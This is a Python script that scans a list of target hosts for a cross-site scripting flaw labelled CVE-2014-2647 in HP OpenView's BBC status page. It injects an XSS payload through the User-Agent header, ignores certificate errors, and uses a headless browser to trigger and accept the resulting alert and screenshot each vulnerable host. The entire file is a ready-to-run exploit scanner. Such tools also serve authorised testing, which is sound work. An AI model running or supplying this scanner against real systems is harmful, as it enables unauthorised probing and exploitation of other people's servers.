#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
from urllib.parse import urlparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys
from termcolor import colored
import tldextract
import os
import json
from urllib.parse import urlparse
from selenium import webdriver
from selenium.webdriver.chrome.options import Options


i=0
name = ""
port = 383

def runner(url):
    global i, name
    i = i + 1
    opts = Options()
    opts.add_argument("--headless")
    opts.add_argument("user-agent= <img src=123 onerror=alert(document.domain)>")
    opts.add_argument('--ignore-ssl-errors=yes')
    opts.add_argument('--ignore-certificate-errors')
    driver = webdriver.Chrome(executable_path='/home/kali/Desktop/scanner/new/chromedriver', chrome_options=opts)
    driver.get(url)
    alrt = driver.switch_to.alert
    alrt.accept()
    driver.maximize_window()
    driver.save_screenshot(str(name) + ".png")
    driver.quit()


def check(url):
    print(colored(url , "yellow"))
    hearders = {'User-Agent': '<img src=123 onerror=alert(document.domain)>'}
    try:
        res = requests.get(url, headers=hearders, allow_redirects=False, verify=False, timeout=(5, 27))
        if res.status_code == 200:
            runner(url)
        print("\n")
    except Exception as e:
        print(e)
        print("\n")


#   MAIN FUNCTION
if __name__ == '__main__':
    try:
        print("\n XSS Vulnerability CVE-2014-2647 ")
        path = input("\nPlease provide the path to file: ")
        file = open(path.__str__().rstrip('\n'), "r")
        print("\n")
        for target in file:
            url = target.__str__().rstrip('\n').rstrip(' ')
            result = urlparse(url)
            name,port = result.netloc.__str__().split(":")
            check(result.scheme.__str__() + "://" + result.netloc.__str__() + "/Hewlett-Packard/OpenView/BBC/status")
    except KeyboardInterrupt:
        print("Canceling script...")
    except Exception as e:
        print(e)
